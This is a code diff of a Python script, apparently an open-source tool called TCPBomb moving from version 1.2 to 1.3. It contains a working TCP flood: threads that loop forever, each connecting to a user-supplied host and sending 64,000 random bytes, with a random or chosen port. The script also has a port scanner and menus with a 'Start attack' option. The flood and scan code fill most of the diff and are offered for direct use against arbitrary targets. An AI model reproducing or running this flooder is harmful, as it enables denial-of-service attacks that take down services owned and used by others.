@@ -2,10 +2,14 @@ import requests,time,socket,random,threading,os,sys
 from datetime import datetime
 sl = 0
 global op
+global port
 
 url = ""
+port = ""
 threads = 0
-port = int(80)
+version = float(1.3)
+currentversion = requests.get('https://raw.githubusercontent.com/Dr4k0D3v/TCPBomb/main/CurrentVersion.json')
+currentversion = float(currentversion.text)
 
 def getIp(domain):
     try:
@@ -26,6 +30,7 @@ def verifyports(url,max = False):
     ip = getIp(url)
     p = 0
     print("_______________________")
+    print("")
     scaneds = 0
     if max:
         p = 65535
@@ -38,16 +43,80 @@ def verifyports(url,max = False):
         if opened == 0:
             scaneds += 1;
             print(porta, "OPEN"); 
-    print("_______________________")
+    
+def getRandomPort():
+    p =  random.randint(1,65535)
+    now = datetime.now();
+    hour = now.hour;
+    minute = now.minute;
+    second = now.second;
+    print(f"[{hour}]:[{minute}]:[{second}] INFO: Using port {p} to attack with 64000 bytes.")
+    return p
+def attack(host,threads, port = getRandomPort()):
+    ip = getIp(host)
+
+    threadList = []
+    for i in range(threads):
+        t = threading.Thread(target=connect,args=(ip,port))
+        t.start()
+        threadList.append(t)
+    t = threading.Thread(target=pr)
+    t.start()
+    threadList.append(t)
+def connect(ip,port):
+    global sl
+    while True:
+
+        bytes = random._urandom(64000)
+        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        try:
+            sl += 1
+            now = datetime.now();
+            hour = now.hour;
+            minute = now.minute;
+            second = now.second;
+            s.connect((ip,port))
+            s.send(bytes)
+            s.close()
+        except:
+            pass
+def pr():
+    global sl
+    global port
+
+    now = datetime.now();
+    hour = now.hour;
+    minute = now.minute;
+    second = now.second
+    print("")
+    print(f"\n[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
+    timemsg = now.second + 3;
+
+    while True:
+        now = datetime.now();
+        second = now.second;
+        if timemsg > 60:
+            timemsg = 0;
+
+        
+        atual = now.second;
+        hour = now.hour;
+        minute = now.minute;
+        if atual == timemsg:
+            timemsg = now.second + 3;
+            print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends!")
+
 def scanMenu():
     print("_______________________")
     print("")
     print("""
     Options:
+
         [1] - Set to max port
         [2] - Set URL
         [3] - Scan
         [4] - Go to Main menu
+
     """)
     print("_______________________")
     print("")
@@ -105,7 +174,7 @@ def httpMenu():
         while True:
             op = int(input("--> "))
             if op == 3:
-            	port = input('Set port -->')
+                port = input('Set port --> ')
             if op == 1:
                 url = input('Set url --> ')
             if op == 2:
@@ -151,12 +220,15 @@ def randomPortMenu():
         [2] - Set Threads number
         [3] - Start attack
         [4] - Go to Main menu
+
     """)
     print("_______________________")
     print("")
     try:
         while True:
             op = int(input("--> "))
+            if op == 3:
+                attack(url,threads)
             if op == 1:
                 url = input('Set url --> ')
             if op == 2:
@@ -199,8 +271,9 @@ def mainMenu():
     print("")
     print('Emanuel and Drako')
     print("")
-    print('Version: v1.2')
+    print(f"Version: {version}")
     print("UpdateData: 06/04/2021")
+    print("")
     print("_______________________")
     time.sleep(2)
     if os.name == 'nt':
@@ -216,6 +289,11 @@ def mainMenu():
     [3] - Port sccan
     [4] - Exit
     """)
+    if currentversion > version:
+        print("")
+        print("    [INFO] New version already available")
+        print("    [LINK] https://github.com/Dr4k0D3v/TCPBomb")
+        print("")
     print("_______________________")
     print("")
     while True:
@@ -250,65 +328,5 @@ def mainMenu():
 
         except:
             print("[INFO] Invalid options please try again!")
-    
-def getRandomPort():
-    p =  random.randint(1,65535)
-    now = datetime.now();
-    hour = now.hour;
-    minute = now.minute;
-    second = now.second;
-    print(f"[{hour}]:[{minute}]:[{second}] INFO: Using port {p} to attack with 64000 bytes.")
-    return p
-def attack(host,threads, port = getRandomPort()):
-    ip = getIp(host)
 
-    threadList = []
-    for i in range(threads):
-        t = threading.Thread(target=connect,args=(ip,port))
-        t.start()
-        threadList.append(t)
-    t = threading.Thread(target=pr)
-    t.start()
-    threadList.append(t)
-def connect(ip,port):
-    global sl
-    while True:
-
-        bytes = random._urandom(64000)
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        try:
-            sl += 1
-            now = datetime.now();
-            hour = now.hour;
-            minute = now.minute;
-            second = now.second;
-            s.connect((ip,port))
-            s.send(bytes)
-            s.close()
-        except:
-            pass
-def pr():
-    global sl
-    
-    now = datetime.now();
-    hour = now.hour;
-    minute = now.minute;
-    second = now.second
-    print("")
-    print(f"\n[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends in port {port}!")
-    timemsg = now.second + 3;
-
-    while True:
-        now = datetime.now();
-        second = now.second;
-        if timemsg > 60:
-            timemsg = 0;
-
-        
-        atual = now.second;
-        hour = now.hour;
-        minute = now.minute;
-        if atual == timemsg:
-            timemsg = now.second + 3;
-            print(f"[{hour}]:[{minute}]:[{second}] INFO: {sl} connections sends in port {port}!")
 mainMenu()
